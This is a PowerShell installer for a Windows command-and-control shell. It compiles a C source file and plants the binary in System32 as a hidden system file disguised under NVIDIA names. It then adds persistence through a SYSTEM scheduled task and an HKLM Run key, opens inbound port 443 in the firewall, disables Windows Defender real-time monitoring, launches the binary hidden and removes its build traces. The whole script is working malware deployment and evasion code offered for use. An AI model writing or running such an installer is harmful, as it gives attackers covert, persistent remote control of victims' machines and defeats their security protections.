# Windows C2 Shell Installer
# Compiles the WMI C2 shell, installs to System32, and sets up persistence
# Requires: Administrator privileges, Visual Studio 2019 Community Edition
# 
# Usage: 
#   Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
#   .\install.ps1

#Requires -RunAsAdministrator

# ============================================================================
# CONFIGURATION
# ============================================================================

$SourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$CompilerPath = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe"
$LinkPath = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\link.exe"
$WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\um\x64"
$WindowsKitInclude = "C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um"
$TargetDir = "C:\Windows\System32"
$ExecutableName = "nvxgstd.exe"
$TargetPath = Join-Path $TargetDir $ExecutableName
$SourceFile = Join-Path $SourceDir "wmi_c2_shell.c"
$ObjectFile = Join-Path $SourceDir "wmi_c2_shell.obj"
$ExecutableFile = Join-Path $SourceDir $ExecutableName

$TaskName = "NVIDIA Graphics Driver Update"
$TaskPath = "\Microsoft\Windows\WindowsUpdate\"
$FullTaskName = "$TaskPath$TaskName"
$RegName = "NVIDIA Graphics Device"
$FirewallRuleName = "NVIDIA Graphics Update Service"

# ============================================================================
# FUNCTIONS
# ============================================================================

function Check-Administrator {
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $Principal = New-Object Security.Principal.WindowsPrincipal($CurrentUser)
    return $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Check-VisualStudio {
    if (-not (Test-Path $CompilerPath)) {
        Write-Host "[!] Visual Studio compiler not found at: $CompilerPath" -ForegroundColor Red
        Write-Host "[!] Install Visual Studio 2019 Community Edition with C++ tools" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $LinkPath)) {
        Write-Host "[!] Linker not found at: $LinkPath" -ForegroundColor Red
        return $false
    }
    if (-not (Test-Path $WindowsKitInclude)) {
        Write-Host "[!] Windows Kit headers not found at: $WindowsKitInclude" -ForegroundColor Red
        Write-Host "[!] Install Windows Driver Kit (WDK)" -ForegroundColor Red
        return $false
    }
    return $true
}

function Check-SourceFiles {
    if (-not (Test-Path $SourceFile)) {
        Write-Host "[!] Source file not found: $SourceFile" -ForegroundColor Red
        return $false
    }
    return $true
}

# ============================================================================
# MAIN INSTALLATION
# ============================================================================

Write-Host ""
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "Windows C2 Shell - Installation Script" -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host ""

# Verify prerequisites
Write-Host "[*] Verifying prerequisites..." -ForegroundColor Yellow

if (-not (Check-Administrator)) {
    Write-Host "[!] ERROR: This script must be run as Administrator" -ForegroundColor Red
    exit 1
}
Write-Host "[+] Running as Administrator" -ForegroundColor Green

if (-not (Check-VisualStudio)) {
    Write-Host "[!] ERROR: Missing required tools (Visual Studio 2019 + WDK)" -ForegroundColor Red
    exit 1
}
Write-Host "[+] Visual Studio and WDK found" -ForegroundColor Green

if (-not (Check-SourceFiles)) {
    exit 1
}
Write-Host "[+] Source files present" -ForegroundColor Green
Write-Host ""

# ============================================================================
# STEP 1: COMPILE
# ============================================================================

Write-Host "[*] STEP 1: Compiling C2 shell..." -ForegroundColor Yellow
try {
    Write-Host "    Compiling to object file..." -ForegroundColor Gray
    $CompileArgs = @(
        "/c", "/W0", "/O2", "/D", "NDEBUG",
        "/I", $WindowsKitInclude,
        $SourceFile,
        "/Fo$ObjectFile"
    )
    & $CompilerPath @CompileArgs 2>&1 | Out-Null
    
    if (-not (Test-Path $ObjectFile)) {
        throw "Object file not created"
    }
    
    Write-Host "    Linking executable..." -ForegroundColor Gray
    $LinkArgs = @(
        "/SUBSYSTEM:CONSOLE", "/MACHINE:X64",
        "/LIBPATH:$WindowsKitLib",
        $ObjectFile,
        "kernel32.lib", "wbemuuid.lib", "oleaut32.lib", "ole32.lib",
        "ws2_32.lib", "secur32.lib", "crypt32.lib",
        "/OUT:$ExecutableFile"
    )
    & $LinkPath @LinkArgs 2>&1 | Out-Null
    
    if (-not (Test-Path $ExecutableFile)) {
        throw "Executable not created"
    }
    
    Write-Host "[+] Compilation successful" -ForegroundColor Green
} catch {
    Write-Host "[!] Compilation failed: $_" -ForegroundColor Red
    exit 1
}

# ============================================================================
# STEP 2: INSTALL TO SYSTEM32
# ============================================================================

Write-Host "[*] STEP 2: Installing executable..." -ForegroundColor Yellow
try {
    if (Test-Path $TargetPath) {
        Write-Host "    Removing existing file..." -ForegroundColor Gray
        Remove-Item -Path $TargetPath -Force -ErrorAction Stop
    }
    
    Write-Host "    Copying to $TargetDir..." -ForegroundColor Gray
    Copy-Item -Path $ExecutableFile -Destination $TargetPath -Force -ErrorAction Stop
    Write-Host "[+] Installed to: $TargetPath" -ForegroundColor Green
} catch {
    Write-Host "[!] Installation failed: $_" -ForegroundColor Red
    exit 1
}

# ============================================================================
# STEP 3: HIDE FILE
# ============================================================================

Write-Host "[*] STEP 3: Hiding executable..." -ForegroundColor Yellow
try {
    $File = Get-Item $TargetPath -Force
    $File.Attributes = $File.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    Write-Host "[+] File hidden with System attributes" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not hide file: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 4: SCHEDULED TASK PERSISTENCE
# ============================================================================

Write-Host "[*] STEP 4: Creating persistence (Scheduled Task)..." -ForegroundColor Yellow
try {
    # Remove if exists
    Unregister-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    
    $Action = New-ScheduledTaskAction -Execute $TargetPath
    $Trigger = @(
        (New-ScheduledTaskTrigger -AtStartup),
        (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 365))
    )
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RunOnlyIfNetworkAvailable -StartWhenAvailable
    $Principal = New-ScheduledTaskPrincipal -UserId SYSTEM -RunLevel Highest
    
    Register-ScheduledTask -TaskName $TaskName `
                          -TaskPath $TaskPath `
                          -Action $Action `
                          -Trigger $Trigger `
                          -Settings $Settings `
                          -Principal $Principal `
                          -Description "NVIDIA Device Update Service" `
                          -Force | Out-Null
    
    Write-Host "[+] Scheduled Task created: $FullTaskName" -ForegroundColor Green
    Write-Host "    - Runs at system startup" -ForegroundColor Gray
    Write-Host "    - Runs every 15 minutes" -ForegroundColor Gray
} catch {
    Write-Host "[!] Warning: Could not create Scheduled Task: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 5: REGISTRY RUN KEY
# ============================================================================

Write-Host "[*] STEP 5: Creating persistence (Registry Run key)..." -ForegroundColor Yellow
try {
    $RegPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Remove if exists
    Remove-ItemProperty -Path $RegPath -Name $RegName -Force -ErrorAction SilentlyContinue | Out-Null
    
    # Add new entry
    New-Item -Path $RegPath -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path $RegPath -Name $RegName -Value $TargetPath -PropertyType String -Force | Out-Null
    
    Write-Host "[+] Registry Run key created: $RegName" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not create Registry entry: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 6: FIREWALL RULE
# ============================================================================

Write-Host "[*] STEP 6: Configuring Windows Firewall..." -ForegroundColor Yellow
try {
    $ExistingRule = Get-NetFirewallRule -DisplayName $FirewallRuleName -ErrorAction SilentlyContinue
    if ($null -ne $ExistingRule) {
        Remove-NetFirewallRule -DisplayName $FirewallRuleName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    }
    
    New-NetFirewallRule -DisplayName $FirewallRuleName `
                        -Direction Inbound `
                        -Action Allow `
                        -Protocol TCP `
                        -LocalPort 443 `
                        -Program $TargetPath `
                        -ErrorAction Stop | Out-Null
    
    Write-Host "[+] Firewall rule created: $FirewallRuleName" -ForegroundColor Green
    Write-Host "    - Port: 443 (HTTPS)" -ForegroundColor Gray
} catch {
    Write-Host "[!] Warning: Could not create Firewall rule: $_" -ForegroundColor Yellow
}

# ============================================================================
# STEP 7: OPTIONAL WINDOWS DEFENDER
# ============================================================================

Write-Host "[*] STEP 7: Windows Defender configuration (optional)..." -ForegroundColor Yellow
try {
    $DefenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
    
    if ($null -eq $DefenderService) {
        Write-Host "[+] Windows Defender not installed (common on many systems)" -ForegroundColor Green
    } else {
        if ($DefenderService.Status -eq "Running") {
            try {
                Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
                Write-Host "[+] Real-time monitoring disabled" -ForegroundColor Green
            } catch {
                Write-Host "[!] Warning: Could not disable real-time monitoring: $_" -ForegroundColor Yellow
                Write-Host "    (This is non-critical; continuing installation)" -ForegroundColor Gray
            }
        } else {
            Write-Host "[+] Windows Defender not running" -ForegroundColor Green
        }
    }
} catch {
    Write-Host "[!] Warning: Could not check Defender status: $_" -ForegroundColor Yellow
    Write-Host "    (Continuing installation)" -ForegroundColor Gray
}

# ============================================================================
# STEP 8: START SERVICE
# ============================================================================

Write-Host "[*] STEP 8: Starting C2 shell..." -ForegroundColor Yellow
try {
    Start-Process -FilePath $TargetPath -WindowStyle Hidden -ErrorAction Stop
    Write-Host "[+] Service started successfully" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not start service immediately: $_" -ForegroundColor Yellow
    Write-Host "    (Will start on next reboot via Scheduled Task)" -ForegroundColor Gray
}

# ============================================================================
# STEP 9: CLEANUP
# ============================================================================

Write-Host "[*] STEP 9: Cleaning up compilation artifacts..." -ForegroundColor Yellow
try {
    Remove-Item -Path $ObjectFile -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $ExecutableFile -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Temporary files cleaned up" -ForegroundColor Green
} catch {
    Write-Host "[!] Warning: Could not remove temporary files: $_" -ForegroundColor Yellow
}

# ============================================================================
# VERIFICATION
# ============================================================================

Write-Host "[*] STEP 10: Verifying installation..." -ForegroundColor Yellow

$AllGood = $true

if (Test-Path $TargetPath) {
    Write-Host "[+] Executable present: $TargetPath" -ForegroundColor Green
    $FileInfo = Get-Item $TargetPath -Force
    $IsHidden = ($FileInfo.Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0
    $IsSystem = ($FileInfo.Attributes -band [System.IO.FileAttributes]::System) -ne 0
    Write-Host "    - Hidden attributes: $IsHidden" -ForegroundColor Gray
    Write-Host "    - System attributes: $IsSystem" -ForegroundColor Gray
} else {
    Write-Host "[!] ERROR: Executable not found at $TargetPath" -ForegroundColor Red
    $AllGood = $false
}

$TaskExists = Get-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -ErrorAction SilentlyContinue
if ($null -ne $TaskExists) {
    Write-Host "[+] Scheduled Task registered" -ForegroundColor Green
} else {
    Write-Host "[!] Warning: Scheduled Task not found" -ForegroundColor Yellow
}

$RegExists = Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegName -ErrorAction SilentlyContinue
if ($null -ne $RegExists) {
    Write-Host "[+] Registry Run key present" -ForegroundColor Green
} else {
    Write-Host "[!] Warning: Registry Run key not found" -ForegroundColor Yellow
}

$FirewallExists = Get-NetFirewallRule -DisplayName $FirewallRuleName -ErrorAction SilentlyContinue
if ($null -ne $FirewallExists) {
    Write-Host "[+] Firewall rule registered" -ForegroundColor Green
} else {
    Write-Host "[!] Warning: Firewall rule not found" -ForegroundColor Yellow
}

Write-Host ""
if ($AllGood) {
    Write-Host "================================================" -ForegroundColor Green
    Write-Host "[✓] Installation Complete!" -ForegroundColor Green
    Write-Host "================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "[*] Persistence Mechanisms:" -ForegroundColor Cyan
    Write-Host "    - Scheduled Task: Runs at startup + every 15 minutes" -ForegroundColor Cyan
    Write-Host "    - Registry Run key: Auto-load on login" -ForegroundColor Cyan
    Write-Host "    - File hidden: System32\nvxgstd.exe (system attributes)" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "[*] Listening on: 0.0.0.0:443 (TCP, HTTPS)" -ForegroundColor Cyan
    Write-Host "[*] Will survive: Reboots, system restarts, user logouts" -ForegroundColor Cyan
} else {
    Write-Host "[!] Installation completed with errors" -ForegroundColor Yellow
    exit 1
}
